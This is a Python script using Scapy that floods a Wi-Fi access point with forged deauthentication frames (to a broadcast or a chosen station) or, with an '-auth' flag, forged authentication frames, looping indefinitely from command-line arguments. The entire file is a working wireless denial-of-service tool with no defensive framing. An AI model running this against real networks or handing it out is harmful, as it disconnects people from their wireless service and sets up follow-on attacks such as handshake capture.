import sys
from scapy.all import *

def deauth_attack(iface, ap_mac, station_mac="FF:FF:FF:FF:FF:FF"):
    print("[*] Starting Deauth Attack!")
    dot11 = Dot11(addr1=station_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap() / dot11 / Dot11Deauth()
    sendp(packet, iface=iface, inter=0.100, loop=1)
    return

def auth_attack(iface, ap_mac, station_mac):
    print("[*] Starting Auth Attack!")
    dot11 = Dot11(addr1=ap_mac, addr2=station_mac, addr3=station_mac)
    packet = RadioTap() / dot11 / Dot11Auth(seqnum=1)
    sendp(packet, iface=iface, inter=0.100, loop=1)
    return

if __name__ == '__main__':
    if(len(sys.argv) == 3):
        deauth_attack(sys.argv[1], sys.argv[2])
        sys.exit(0)

    elif(len(sys.argv) == 4):
        deauth_attack(sys.argv[1], sys.argv[2], sys.argv[3])
        sys.exit(0)

    elif(len(sys.argv) == 5 and sys.argv[4] == "-auth"):
        auth_attack(sys.argv[1], sys.argv[2], sys.argv[3])
        sys.exit(0)

    else :
        print("[*] How to use?\n# python3 {} <interface> <ap mac> [<station mac> [-auth]]".format(sys.argv[0]))
        sys.exit(0)
